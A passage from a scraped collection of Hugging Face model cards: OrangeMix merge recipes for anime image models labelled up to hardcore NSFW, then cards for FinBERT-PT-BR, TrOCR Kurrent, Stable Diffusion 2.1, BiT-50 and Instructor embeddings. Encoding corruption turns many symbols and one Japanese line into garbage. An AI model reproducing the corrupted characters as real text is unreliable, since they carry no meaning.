„Äå9e2c6ceff3f6d6f65c6fb0e10d8e69d772871813be647fd2ea5d06e00db33c1f„Äç\nsd1.5_pruned\n[] „Äåe1441589a6f3c5a53f5f54d0975a18a7feb7cdf0b0dee276dfc3331ae376a053„Äç\nAbyssOrangeMix_base (AOMb)\n‚ñº?\nThe basic trick for this merged model is to incorporate a model that has learned more than 1m Instagram photos (mostly Japanese) or a photorealistic model like f222. The choice of base model here depends on the person. I chose AnythingV3 for versatility.\n‚ñºInstructions:\nSTEP: 1ÔΩúCreation of photorealistic model for Merge\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 1.0\ninstagram-latest-plus-clip-v6e1_50000\nf222\nsd1.5_pruned\nInsta_F222\nSTEP: 2ÔΩúBlock Merge\nModel: A\nModel: B\nWeight\nBase alpha\nMerge Name\nAnythingV3.0\nInsta_F222\n1,0.9,0.7,0.5,0.3,0.1,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1,0.3,0.5,0.7,0.9,1\n0\nAbyssOrangeMix_base\nAbyssOrangeMix_Night (AOMn)\n‚ñº?\nJUST AbyssOrangeMix_base+ (NAI-NAISFW) 0.3.\n‚ñºInstructions:\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.3\nAbyssOrangeMix_base\nNovelAI animefull\nNovelAI sfw\nAbyssOrangeMix_Night\nAbyssOrangeMix_half (AOMh)\n‚ñº?\n+Gape0.5 version AbyssOrangeMix.\n‚ñºInstructions:\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.5\nAbyssOrangeMix_Night\nGape60\nNovelAI animefull\nAbyssOrangeMix_half\nAbyssOrangeMix (AOM)\n‚ñºInstructions:\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 1.0\nAbyssOrangeMix_Night\nGape60\nNovelAI animefull\nAbyssOrangeMix\nElyOrangeMix (ELOM)\n‚ñº?Elysium_Anime_V2 + NAI + Gape.This is a merge model that improves on the Elysium_Anime_V2, where NSFW representation is not good.It can produce SFW, NSFW, and any other type of artwork, while retaining the Elysium's three-dimensional, thickly painted style.\n‚ñº How to choice models\n_base : SFWüòâ\n_Night : SFW ÔΩû Soft NSFWü•∞\n_half : SFW ÔΩû NSFWüëÑ\nunlabeled : SFW ÔΩû HARDCORE ÔΩûü§Ø  ex)AbyssOrangeMix, BloodOrangeMix...etc\n‚ñºHow to use\nVAE: orangemix.vae.pt\n‚ñºHash (SHA256)\nElyOrangeMix [6b508e59]\nElyOrangeMix_half [6b508e59]\nElyNightOrangeMix[6b508e59]\nElyOrangeMix (ELOM)\n‚ñºUse Models\nElysium_Anime_V2 [6b508e59]\nNovelAI animefull-final-pruned [925997e9]\nNovelAI sfw [1d4a34af]\nGape60 [25396b85]\n‚ñºInstructions\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.3\nElysium_Anime_V2\nNovelAI animefull\nNovelAI sfw\ntempmix-part1 []\n2\nAdd Difference @ 1.0\ntempmix-part1\nGape60\nNovelAI animefull\nElyOrangeMix  [6b508e59]\nElyOrangeMix_half (ELOMh)\n‚ñº?\n+Gape0.5 version ElyOrangeMix.\n‚ñºUse Models\nElysium_Anime_V2 [6b508e59]\nNovelAI animefull-final-pruned [925997e9]\nNovelAI sfw [1d4a34af]\nGape60 [25396b85]\n‚ñºInstructions\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.3\nElysium_Anime_V2\nNovelAI animefull\nNovelAI sfw\ntempmix-part1 []\n2\nAdd Difference @ 0.5\ntempmix-part1\nGape60\nNovelAI animefull\nElyOrangeMix_half  [6b508e59]\nElyNightOrangeMix (ELOMn)\n‚ñº?\nIt is a merged model that just did Elysium_Anime_V2+ (NAI-NAISFW) 0.3.\n‚ñºUse Models\nElysium_Anime_V2 [6b508e59]\nNovelAI animefull-final-pruned [925997e9]\nNovelAI sfw [1d4a34af]\n‚ñºInstructions\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.3\nElysium_Anime_V2\nNovelAI animefull\nNovelAI sfw\nElyNightOrangeMix\nBloodOrangeMix (BOM)\n‚ñº?\nAnything+NAI+Gape.This is a merge model that improves on the AnythingV3, where NSFW representation is not good.It can produce SFW, NSFW, and any other type of artwork, while retaining the flat, beautifully painted style of AnythingV3.Stable. Popular in the Japanese community.\n‚ñºModelList & [] = WebUI Hash,„Äå„Äç= SHA256\nBloodNightOrangeMix.ckpt[ffa7b160]„Äåf8aff727ba3da0358815b1766ed232fd1ef9682ad165067cac76e576d19689e0„Äç\nBloodOrangeMix_half.ckpt [ffa7b160]„Äåb2168aaa59fa91229b8add21f140ac9271773fe88a387276f3f0c7d70f726a83„Äç\nBloodOrangeMix.ckpt[ffa7b160] „Äå25cece3fe303ea8e3ad40c3dca788406dbd921bcf3aa8e3d1c7c5ac81f208a4f„Äç\nBloodOrangeMix.safetensors„Äå79a1edf6af43c75ee1e00a884a09213a28ee743b2e913de978cb1f6faa1b320d„Äç\n‚ñº How to choice models\n_base : SFWüòâ\n_Night : SFW ÔΩû Soft NSFWü•∞\n_half : SFW ÔΩû NSFWüëÑ\nunlabeled : SFW ÔΩû HARDCORE ÔΩûü§Ø  ex)AbyssOrangeMix, BloodOrangeMix...etc\n‚ñºHow to use\nVAE: orangemix.vae.pt\nBloodOrangeMix (BOM)\n‚ñºUse Models\nAnythingV3.0 huggingface pruned [2700c435]\nNovelAI animefull-final-pruned [925997e9]\nNovelAI sfw [1d4a34af]\nGape60 [25396b85]\n‚ñºInstructions\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.3\nAnythingV3.0\nNovelAI animefull\nNovelAI sfw\ntempmix-part1 []\n2\nAdd Difference @ 1.0\ntempmix-part1\nGape60\nNovelAI animefull\nBloodOrangeMix [ffa7b160]\nBloodOrangeMix_half (BOMh)\n‚ñº?\nAnything+Nai+Gape0.5\n+Gape0.5 version BloodOrangeMix.\nNSFW expression will be softer and have less impact on the Anything style painting style.\n‚ñºUse Models\nAnythingV3.0 huggingface pruned [2700c435]\nNovelAI animefull-final-pruned [925997e9]\nNovelAI sfw [1d4a34af]\nGape60 [25396b85]\n‚ñºInstructions\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.3\nAnythingV3.0\nNovelAI animefull\nNovelAI sfw\ntempmix-part1 []\n2\nAdd Difference @ 0.5\ntempmix-part1\nGape60\nNovelAI animefull\nBloodOrangeMix_half [ffa7b160]\nBloodNightOrangeMix (BOMn)\n‚ñº?\nIt is a merged model that just did AnythingV3+ (NAI-NAISFW) 0.3.\n‚ñºUse Models\nAnythingV3.0 huggingface pruned [2700c435]\nNovelAI animefull-final-pruned [925997e9]\nNovelAI sfw [1d4a34af]\n‚ñºInstructions\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.3\nAnythingV3.0\nNovelAI animefull\nNovelAI sfw\nBloodNightOrangeMix\nElderOrangeMix\n‚ÄªI found this model to be very prone to body collapse. Not recommended.\n‚ñº?anything and everything mix ver.1.5+Gape+Nai(AnEve.G.N0.3)This is a merged model with improved NSFW representation of anything and everything mix ver.1.5.\n‚ñºHash\n[3a46a1e0]\n‚ñºUse Models\nanything and everything mix ver.1.5 [5265dcf6]\nNovelAI animefull-final-pruned [925997e9]\nNovelAI sfw [1d4a34af]\nGape60 [25396b85]\n‚ñºInstructions:**\nStep\nInterpolation Method\nPrimary Model\nSecondary Model\nTertiary Model\nMerge Name\n1\nAdd Difference @ 0.5\nanything and everything mix ver.1.5\nGape60\nNovelAI full\ntempmix-part1 []\n2\nAdd Difference @ 0.3\ntempmix-part1\nNovelAI full\nNovelAI sfw\nElderOrangeMix  [3a46a1e0]\nTroubleshooting\nblurred Images & clearly low quality outputIf the generated images are blurred or only clearly low quality output is produced, it is possible that the vae, etc. are not loaded properly. Try reloading the model/vae or restarting the WebUI/OS.\nFAQ and Tips (üêàMEME ZONEü¶ê)\nTrash zone.\n‚ñºNoooo, not work. This guy is ScammerSTEP1: BUY HUGE PC\n‚ñºNoooo, can't generate image like samples.This models is hype.\n‚ùå\nüü¢\n‚ñºNoooo, This models have troy virus. don't download.\nAll models in this repository are secure. It is most likely that anti-virus software has detected them erroneously.However, the models with the .ckpt extension have the potential danger of executing arbitrary code.A safe model that is free from these dangers is the model with the .safetensors extension.\n‚ñºAOM2?(only NSFW models)\n‚ñºAOM3A1?R.I.P.\n‚ñºNoooo^()&*%#NG0u!!!!!!!!Á∏∫„ÇÖ‚ôÄÁπß?Á∏∫Âåª?Á∏∫ÔΩ§ÁπùÔΩºÁ∏∫ÔΩ®Á∏∫Âåª?Á∏∫Âê∂ÔΩäÁπùÔΩºÁ∏∫ÔΩØÈ©ï‰∏ªÔΩ≠ÔΩ¶ÈÑôÂÅµ?ÁπßÔΩ¥ÁπùÊ∫ò„ÄíÁ∏∫? („ÄåAOM3A2 and A3 are overlearning and Trash. delete!„Äç)\n‚ñºNoooo, Too many models. Tell me which one to choose.\n‚Üí ÂÖ®ÈÉ®Âêå„Åò„Åò„ÇÉ„Å™„ÅÑ„Åß„Åô„Åã",
    "lucas-leme/FinBERT-PT-BR": "FinBERT-PT-BR : Financial BERT PT BR\nApplications\nSentiment Index\nUsage\nAuthor\nCitation\nPaper\nFinBERT-PT-BR : Financial BERT PT BR\nFinBERT-PT-BR is a pre-trained NLP model to analyze sentiment of Brazilian Portuguese financial texts.\nThe model was trained in two main stages: language modeling and sentiment modeling. In the first stage, a language model was trained with more than 1.4 million texts of financial news in Portuguese.\nFrom this first training, it was possible to build a sentiment classifier with few labeled texts (500) that presented a satisfactory convergence.\nAt the end of the work, a comparative analysis with other models and the possible applications of the developed model are presented.\nIn the comparative analysis, it was possible to observe that the developed model presented better results than the current models in the state of the art.\nAmong the applications, it was demonstrated that the model can be used to build sentiment indices, investment strategies and macroeconomic data analysis, such as inflation.\nApplications\nSentiment Index\nUsage\nBertForSequenceClassification\nfrom transformers import AutoTokenizer, BertForSequenceClassification\nimport numpy as np\npred_mapper = {\n0: \"POSITIVE\",\n1: \"NEGATIVE\",\n2: \"NEUTRAL\"\n}\ntokenizer = AutoTokenizer.from_pretrained(\"lucas-leme/FinBERT-PT-BR\")\nfinbertptbr = BertForSequenceClassification.from_pretrained(\"lucas-leme/FinBERT-PT-BR\")\ntokens = tokenizer([\"Hoje a bolsa caiu\", \"Hoje a bolsa subiu\"], return_tensors=\"pt\",\npadding=True, truncation=True, max_length=512)\nfinbertptbr_outputs = finbertptbr(**tokens)\npreds = [pred_mapper[np.argmax(pred)] for pred in finbertptbr_outputs.logits.cpu().detach().numpy()]\nPipeline\nfrom transformers import (\nAutoTokenizer,\nBertForSequenceClassification,\npipeline,\n)\nfinbert_pt_br_tokenizer = AutoTokenizer.from_pretrained(\"lucas-leme/FinBERT-PT-BR\")\nfinbert_pt_br_model = BertForSequenceClassification.from_pretrained(\"lucas-leme/FinBERT-PT-BR\")\nfinbert_pt_br_pipeline = pipeline(task='text-classification', model=finbert_pt_br_model, tokenizer=finbert_pt_br_tokenizer)\nfinbert_pt_br_pipeline(['Hoje a bolsa caiu', 'Hoje a bolsa subiu'])\nAuthor\nLucas Leme - lucaslssantos99@gmail.com\nCitation\n@inproceedings{santos2023finbert,\ntitle={FinBERT-PT-BR: An{\\'a}lise de Sentimentos de Textos em Portugu{\\^e}s do Mercado Financeiro},\nauthor={Santos, Lucas L and Bianchi, Reinaldo AC and Costa, Anna HR},\nbooktitle={Anais do II Brazilian Workshop on Artificial Intelligence in Finance},\npages={144--155},\nyear={2023},\norganization={SBC}\n}\nPaper\nPaper: FinBERT-PT-BR: Sentiment Analysis of Texts in Portuguese from the Financial Market\nUndergraduate thesis: FinBERT-PT-BR: An√°lise de sentimentos de textos em portugu√™s referentes ao mercado financeiro",
    "dh-unibe/trocr-kurrent": "TrOCR Kurrent-Model 19th century\nTrOCR Kurrent-Model 19th century\nHandwritten Text Recognition model for 19th century German.\nPart of the developments at the Digital Humanities@University of Bern.\nDeveloped by Jonas Widmer and Tobias Hodel in conjunction with researchers and institutions mentioned below.\nBase model: microsoft/trocr-base-handwritten\nTrain Lines: 292'997Eval Lines: 7'513Test Lines: 15'817\nEpochs: 19.66 / 20Eval CER: 0.02827Test CER: 0.02655\nFinetuned on Kurrent-dataset, containing:\nMaterial from the State Archives of Zurich (\"Regierungsratsprotokolle\"), provided by the State Archives of Zurich\nLecture notes of Humboldt Lectures, provided by the Berlin-Brandenburgian Academy of Sciences\nDiary of Eugen Huber, provided by the University of Zurich\nHandwriting and Copies by and of Gottfried Semper (provided by the respective research project at ETH Z√ºrich and USI Mendrisio)\nKonzilsprotokolle, University of Greifswald (19th century)\nas well as many other smaller collections/examples\nThe model has not been extensively tested.\nPotential biases are still to be identified.",
    "stabilityai/stable-diffusion-2-1": "Stable Diffusion v2-1 Model Card\nModel Details\nExamples\nUses\nDirect Use\nMisuse, Malicious Use, and Out-of-Scope Use\nLimitations and Bias\nLimitations\nBias\nTraining\nEvaluation Results\nEnvironmental Impact\nCitation\nStable Diffusion v2-1 Model Card\nThis model card focuses on the model associated with the Stable Diffusion v2-1 model, codebase available here.\nThis stable-diffusion-2-1 model is fine-tuned from stable-diffusion-2 (768-v-ema.ckpt) with an additional 55k steps on the same dataset (with punsafe=0.1), and then fine-tuned for another 155k extra steps with punsafe=0.98.\nUse it with the stablediffusion repository: download the v2-1_768-ema-pruned.ckpt here.\nUse it with üß® diffusers\nModel Details\nDeveloped by: Robin Rombach, Patrick Esser\nModel type: Diffusion-based text-to-image generation model\nLanguage(s): English\nLicense: CreativeML Open RAIL++-M License\nModel Description: This is a model that can be used to generate and modify images based on text prompts. It is a Latent Diffusion Model that uses a fixed, pretrained text encoder (OpenCLIP-ViT/H).\nResources for more information: GitHub Repository.\nCite as:\n@InProceedings{Rombach_2022_CVPR,\nauthor    = {Rombach, Robin and Blattmann, Andreas and Lorenz, Dominik and Esser, Patrick and Ommer, Bj\\\"orn},\ntitle     = {High-Resolution Image Synthesis With Latent Diffusion Models},\nbooktitle = {Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)},\nmonth     = {June},\nyear      = {2022},\npages     = {10684-10695}\n}\nExamples\nUsing the ü§ó's Diffusers library to run Stable Diffusion 2 in a simple and efficient manner.\npip install diffusers transformers accelerate scipy safetensors\nRunning the pipeline (if you don't swap the scheduler it will run with the default DDIM, in this example we are swapping it to DPMSolverMultistepScheduler):\nimport torch\nfrom diffusers import StableDiffusionPipeline, DPMSolverMultistepScheduler\nmodel_id = \"stabilityai/stable-diffusion-2-1\"\n# Use the DPMSolverMultistepScheduler (DPM-Solver++) scheduler here instead\npipe = StableDiffusionPipeline.from_pretrained(model_id, torch_dtype=torch.float16)\npipe.scheduler = DPMSolverMultistepScheduler.from_config(pipe.scheduler.config)\npipe = pipe.to(\"cuda\")\nprompt = \"a photo of an astronaut riding a horse on mars\"\nimage = pipe(prompt).images[0]\nimage.save(\"astronaut_rides_horse.png\")\nNotes:\nDespite not being a dependency, we highly recommend you to install xformers for memory efficient attention (better performance)\nIf you have low GPU RAM available, make sure to add a pipe.enable_attention_slicing() after sending it to cuda for less VRAM usage (to the cost of speed)\nUses\nDirect Use\nThe model is intended for research purposes only. Possible research areas and tasks include\nSafe deployment of models which have the potential to generate harmful content.\nProbing and understanding the limitations and biases of generative models.\nGeneration of artworks and use in design and other artistic processes.\nApplications in educational or creative tools.\nResearch on generative models.\nExcluded uses are described below.\nMisuse, Malicious Use, and Out-of-Scope Use\nNote: This section is originally taken from the DALLE-MINI model card, was used for Stable Diffusion v1, but applies in the same way to Stable Diffusion v2.\nThe model should not be used to intentionally create or disseminate images that create hostile or alienating environments for people. This includes generating images that people would foreseeably find disturbing, distressing, or offensive; or content that propagates historical or current stereotypes.\nOut-of-Scope Use\nThe model was not trained to be factual or true representations of people or events, and therefore using the model to generate such content is out-of-scope for the abilities of this model.\nMisuse and Malicious Use\nUsing the model to generate content that is cruel to individuals is a misuse of this model. This includes, but is not limited to:\nGenerating demeaning, dehumanizing, or otherwise harmful representations of people or their environments, cultures, religions, etc.\nIntentionally promoting or propagating discriminatory content or harmful stereotypes.\nImpersonating individuals without their consent.\nSexual content without consent of the people who might see it.\nMis- and disinformation\nRepresentations of egregious violence and gore\nSharing of copyrighted or licensed material in violation of its terms of use.\nSharing content that is an alteration of copyrighted or licensed material in violation of its terms of use.\nLimitations and Bias\nLimitations\nThe model does not achieve perfect photorealism\nThe model cannot render legible text\nThe model does not perform well on more difficult tasks which involve compositionality, such as rendering an image corresponding to ‚ÄúA red cube on top of a blue sphere‚Äù\nFaces and people in general may not be generated properly.\nThe model was trained mainly with English captions and will not work as well in other languages.\nThe autoencoding part of the model is lossy\nThe model was trained on a subset of the large-scale dataset\nLAION-5B, which contains adult, violent and sexual content. To partially mitigate this, we have filtered the dataset using LAION's NFSW detector (see Training section).\nBias\nWhile the capabilities of image generation models are impressive, they can also reinforce or exacerbate social biases.\nStable Diffusion was primarily trained on subsets of LAION-2B(en),\nwhich consists of images that are limited to English descriptions.\nTexts and images from communities and cultures that use other languages are likely to be insufficiently accounted for.\nThis affects the overall output of the model, as white and western cultures are often set as the default. Further, the\nability of the model to generate content with non-English prompts is significantly worse than with English-language prompts.\nStable Diffusion v2 mirrors and exacerbates biases to such a degree that viewer discretion must be advised irrespective of the input or its intent.\nTraining\nTraining Data\nThe model developers used the following dataset for training the model:\nLAION-5B and subsets (details below). The training data is further filtered using LAION's NSFW detector, with a \"p_unsafe\" score of 0.1 (conservative). For more details, please refer to LAION-5B's NeurIPS 2022 paper and reviewer discussions on the topic.\nTraining Procedure\nStable Diffusion v2 is a latent diffusion model which combines an autoencoder with a diffusion model that is trained in the latent space of the autoencoder. During training,\nImages are encoded through an encoder, which turns images into latent representations. The autoencoder uses a relative downsampling factor of 8 and maps images of shape H x W x 3 to latents of shape H/f x W/f x 4\nText prompts are encoded through the OpenCLIP-ViT/H text-encoder.\nThe output of the text encoder is fed into the UNet backbone of the latent diffusion model via cross-attention.\nThe loss is a reconstruction objective between the noise that was added to the latent and the prediction made by the UNet. We also use the so-called v-objective, see https://arxiv.org/abs/2202.00512.\nWe currently provide the following checkpoints:\n512-base-ema.ckpt: 550k steps at resolution 256x256 on a subset of LAION-5B filtered for explicit pornographic material, using the LAION-NSFW classifier with punsafe=0.1 and an aesthetic score >= 4.5.\n850k steps at resolution 512x512 on the same dataset with resolution >= 512x512.\n768-v-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for 150k steps using a v-objective on the same dataset. Resumed for another 140k steps on a 768x768 subset of our dataset.\n512-depth-ema.ckpt: Resumed from 512-base-ema.ckpt and finetuned for 200k steps. Added an extra input channel to process the (relative) depth prediction produced by MiDaS (dpt_hybrid) which is used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized.\n512-inpainting-ema.ckpt: Resumed from 512-base-ema.ckpt and trained for another 200k steps. Follows the mask-generation strategy presented in LAMA which, in combination with the latent VAE representations of the masked image, are used as an additional conditioning.\nThe additional input channels of the U-Net which process this extra information were zero-initialized. The same strategy was used to train the 1.5-inpainting checkpoint.\nx4-upscaling-ema.ckpt: Trained for 1.25M steps on a 10M subset of LAION containing images >2048x2048. The model was trained on crops of size 512x512 and is a text-guided latent upscaling diffusion model.\nIn addition to the textual input, it receives a noise_level as an input parameter, which can be used to add noise to the low-resolution input according to a predefined diffusion schedule.\nHardware: 32 x 8 x A100 GPUs\nOptimizer: AdamW\nGradient Accumulations: 1\nBatch: 32 x 8 x 2 x 4 = 2048\nLearning rate: warmup to 0.0001 for 10,000 steps and then kept constant\nEvaluation Results\nEvaluations with different classifier-free guidance scales (1.5, 2.0, 3.0, 4.0,\n5.0, 6.0, 7.0, 8.0) and 50 steps DDIM sampling steps show the relative improvements of the checkpoints:\nEvaluated using 50 DDIM steps and 10000 random prompts from the COCO2017 validation set, evaluated at 512x512 resolution.  Not optimized for FID scores.\nEnvironmental Impact\nStable Diffusion v1 Estimated Emissions\nBased on that information, we estimate the following CO2 emissions using the Machine Learning Impact calculator presented in Lacoste et al. (2019). The hardware, runtime, cloud provider, and compute region were utilized to estimate the carbon impact.\nHardware Type: A100 PCIe 40GB\nHours used: 200000\nCloud Provider: AWS\nCompute Region: US-east\nCarbon Emitted (Power consumption x Time x Carbon produced based on location of power grid): 15000 kg CO2 eq.\nCitation\n@InProceedings{Rombach_2022_CVPR,\nauthor    = {Rombach, Robin and Blattmann, Andreas and Lorenz, Dominik and Esser, Patrick and Ommer, Bj\\\"orn},\ntitle     = {High-Resolution Image Synthesis With Latent Diffusion Models},\nbooktitle = {Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)},\nmonth     = {June},\nyear      = {2022},\npages     = {10684-10695}\n}\nThis model card was written by: Robin Rombach, Patrick Esser and David Ha and is based on the Stable Diffusion v1 and DALL-E Mini model card.",
    "google/bit-50": "Big Transfer (BiT)\nModel description\nIntended uses & limitations\nHow to use\nBibTeX entry and citation info\nBig Transfer (BiT)\nThe BiT model was proposed in Big Transfer (BiT): General Visual Representation Learning by Alexander Kolesnikov, Lucas Beyer, Xiaohua Zhai, Joan Puigcerver, Jessica Yung, Sylvain Gelly, Neil Houlsby.\nBiT is a simple recipe for scaling up pre-training of ResNet-like architectures (specifically, ResNetv2). The method results in significant improvements for transfer learning.\nDisclaimer: The team releasing ResNet did not write a model card for this model so this model card has been written by the Hugging Face team.\nModel description\nThe abstract from the paper is the following:\nTransfer of pre-trained representations improves sample efficiency and simplifies hyperparameter tuning when training deep neural networks for vision. We revisit the paradigm of pre-training on large supervised datasets and fine-tuning the model on a target task. We scale up pre-training, and propose a simple recipe that we call Big Transfer (BiT). By combining a few carefully selected components, and transferring using a simple heuristic, we achieve strong performance on over 20 datasets. BiT performs well across a surprisingly wide range of data regimes -- from 1 example per class to 1M total examples. BiT achieves 87.5% top-1 accuracy on ILSVRC-2012, 99.4% on CIFAR-10, and 76.3% on the 19 task Visual Task Adaptation Benchmark (VTAB). On small datasets, BiT attains 76.8% on ILSVRC-2012 with 10 examples per class, and 97.0% on CIFAR-10 with 10 examples per class. We conduct detailed analysis of the main components that lead to high transfer performance.\nIntended uses & limitations\nYou can use the raw model for image classification. See the model hub to look for\nfine-tuned versions on a task that interests you.\nHow to use\nHere is how to use this model to classify an image of the COCO 2017 dataset into one of the 1,000 ImageNet classes:\nfrom transformers import BitImageProcessor, BitForImageClassification\nimport torch\nfrom datasets import load_dataset\ndataset = load_dataset(\"huggingface/cats-image\")\nimage = dataset[\"test\"][\"image\"][0]\nfeature_extractor = BitImageProcessor.from_pretrained(\"google/bit-50\")\nmodel = BitForImageClassification.from_pretrained(\"google/bit-50\")\ninputs = feature_extractor(image, return_tensors=\"pt\")\nwith torch.no_grad():\nlogits = model(**inputs).logits\n# model predicts one of the 1000 ImageNet classes\npredicted_label = logits.argmax(-1).item()\nprint(model.config.id2label[predicted_label\n>>> tabby, tabby cat\nFor more code examples, we refer to the documentation.\nBibTeX entry and citation info\n@misc{https://doi.org/10.48550/arxiv.1912.11370,\ndoi = {10.48550/ARXIV.1912.11370},\nurl = {https://arxiv.org/abs/1912.11370},\nauthor = {Kolesnikov, Alexander and Beyer, Lucas and Zhai, Xiaohua and Puigcerver, Joan and Yung, Jessica and Gelly, Sylvain and Houlsby, Neil},\nkeywords = {Computer Vision and Pattern Recognition (cs.CV), Machine Learning (cs.LG), FOS: Computer and information sciences, FOS: Computer and information sciences},\ntitle = {Big Transfer (BiT): General Visual Representation Learning},\npublisher = {arXiv},\nyear = {2019},\ncopyright = {arXiv.org perpetual, non-exclusive license}\n}",
    "hkunlp/instructor-base": "hkunlp/instructor-base\nQuick start\nInstallation\nCompute your customized embeddings\nUse cases\nCalculate embeddings for your customized texts\nCalculate Sentence similarities\nInformation Retrieval\nClustering\nhkunlp/instructor-base\nWe introduce Instructorüë®‚Äçüè´, an instruction-finetuned text embedding model that can generate text embeddings tailored to any task (e.g., classification, retrieval, clustering, text evaluation, etc.) and domains (e.g., science, finance, etc.) by simply providing the task instruction, without any finetuning. Instructorüë®‚Äç achieves sota on 70 diverse embedding tasks!\nThe model is easy to use with our customized sentence-transformer library. For more details, check out our paper and project page!\n**************************** Updates ****************************\n01/21: We released a new checkpoint trained with hard negatives, which gives better performance.\n12/21: We released our paper, code, checkpoint and project page! Check them out!\nQuick start\nInstallation\npip install InstructorEmbedding\nCompute your customized embeddings\nThen you can use the model like this to calculate domain-specific and task-aware embeddings:\nfrom InstructorEmbedding import INSTRUCTOR\nmodel = INSTRUCTOR('hkunlp/instructor-base')\nsentence = \"3D ActionSLAM: wearable person tracking in multi-floor environments\"\ninstruction = \"Represent the Science title:\"\nembeddings = model.encode([[instruction,sentence]])\nprint(embeddings)\nUse cases\nCalculate embeddings for your customized texts\nIf you want to calculate customized embeddings for specific sentences, you may follow the unified template to write instructions:\nRepresent the domain text_type for task_objective:\ndomain is optional, and it specifies the domain of the text, e.g., science, finance, medicine, etc.\ntext_type is required, and it specifies the encoding unit, e.g., sentence, document, paragraph, etc.\ntask_objective is optional, and it specifies the objective of embedding, e.g., retrieve a document, classify the sentence, etc.\nCalculate Sentence similarities\nYou can further use the model to compute similarities between two groups of sentences, with customized embeddings.\nfrom sklearn.metrics.pairwise import cosine_similarity\nsentences_a = [['Represent the Science sentence: ','Parton energy loss in QCD matter'],\n['Represent the Financial statement: ','The Federal Reserve on Wednesday raised its benchmark interest rate.']]\nsentences_b = [['Represent the Science sentence: ','The Chiral Phase Transition in Dissipative Dynamics'],\n['Represent the Financial statement: ','The funds rose less than 0.5 per cent on Friday']]\nembeddings_a = model.encode(sentences_a)\nembeddings_b = model.encode(sentences_b)\nsimilarities = cosine_similarity(embeddings_a,embeddings_b)\nprint(similarities)\nInformation Retrieval\nYou can also use customized embeddings for information retrieval.\nimport numpy as np\nfrom sklearn.metrics.pairwise import cosine_similarity\nquery  = [['Represent the Wikipedia question for retrieving supporting documents: ','where is the food stored in a yam plant']]\ncorpus = [['Represent the Wikipedia document for retrieval: ','Capitalism has been dominant in the Western world since the end of feudalism, but most feel[who?] that the term \"mixed economies\" more precisely describes most contemporary economies, due to their containing both private-owned and state-owned enterprises. In capitalism, prices determine the demand-supply scale. For example, higher demand for certain goods and services lead to higher prices and lower demand for certain goods lead to lower prices.'],\n['Represent the Wikipedia document for retrieval: ',\"The disparate impact theory is especially controversial under the Fair Housing Act because the Act regulates many activities relating to housing, insurance, and mortgage loans√¢‚Ç¨‚Äùand some scholars have argued that the theory's use under the Fair Housing Act, combined with extensions of the Community Reinvestment Act, contributed to rise of sub-prime lending and the crash of the U.S. housing market and ensuing global economic recession\"],\n['Represent the Wikipedia document for retrieval: ','Disparate impact in United States labor law refers to practices in employment, housing, and other areas that adversely affect one group of people of a protected characteristic more than another, even though rules applied by employers or landlords are formally neutral. Although the protected classes vary by statute, most federal civil rights laws protect based on race, color, religion, national origin, and sex as protected traits, and some laws include disability status and other traits as well.']]\nquery_embeddings = model.encode(query)\ncorpus_embeddings = model.encode(corpus)\nsimilarities = cosine_similarity(query_embeddings,corpus_embeddings)\nretrieved_doc_id = np.argmax(similarities)\nprint(retrieved_doc_id)\nClustering\nUse customized embeddings for clustering texts in groups.\nimport sklearn.cluster\nsentences = [['Represent the Medicine sentence for clustering: ','Dynamical Scalar Degree of Freedom in Horava-Lifshitz Gravity'],\n['Represent the Medicine sentence for clustering: ','Comparison of Atmospheric Neutrino Flux Calculations at Low Energies'],\n['Represent the Medicine sentence for clustering: ','Fermion Bags in the Massive Gross-Neveu Model'],\n['Represent the Medicine sentence for clustering: ',\"QCD corrections to Associated t-tbar-H production at the Tevatron\"],\n['Represent the Medicine sentence for clustering: ','A New Analysis of the R Measurements: Resonance Parameters of the Higher,  Vector States of Charmonium']]\nembeddings = model.encode(sentences)\nclustering_model = sklearn.cluster.MiniBatchKMeans(n_clusters=2)\nclustering_model.fit(embeddings)\ncluster_assignment = clustering_model.labels_\nprint(cluster_assignment)",
    "hkunlp/instructor-xl": "hkunlp/instructor-xl\nQuick start\nInstallation\nCompute your customized embeddings\nUse cases\nCalculate embeddings for your customized texts\nCalculate Sentence similarities\nInformation Retrieval\nClustering\nhkunlp/instructor-xl\nWe introduce Instructorüë®‚Äçüè´, an instruction-finetuned text embedding model that can generate text embeddings tailored to any task (e.g., classification, retrieval, clustering, text evaluation, etc.) and domains (e.g., science, finance, etc.) by simply providing the task instruction, without any finetuning. Instructorüë®‚Äç achieves sota on 70 diverse embedding tasks!\nThe model is easy to use with our customized sentence-transformer library. For more details, check out our paper and project page!\n**************************** Updates ****************************\n01/21: We released a new checkpoint trained with hard negatives, which gives better performance.\n12/21: We released our paper, code, checkpoint and project page! Check them out!\nQuick start\nInstallation\npip install InstructorEmbedding\nCompute your customized embeddings\nThen you can use the model like this to calculate domain-specific and task-aware embeddings:\nfrom InstructorEmbedding import INSTRUCTOR\nmodel = INSTRUCTOR('hkunlp/instructor-xl')\nsentence = \"3D ActionSLAM: wearable person tracking in multi-floor environments\"\ninstruction = \"Represent the Science title:\"\nembeddings = model.encode([[instruction,sentence]])\nprint(embeddings)\nUse cases\nCalculate embeddings for your customized texts\nIf you want to calculate customized embeddings for specific sentences, you may follow the unified template to write 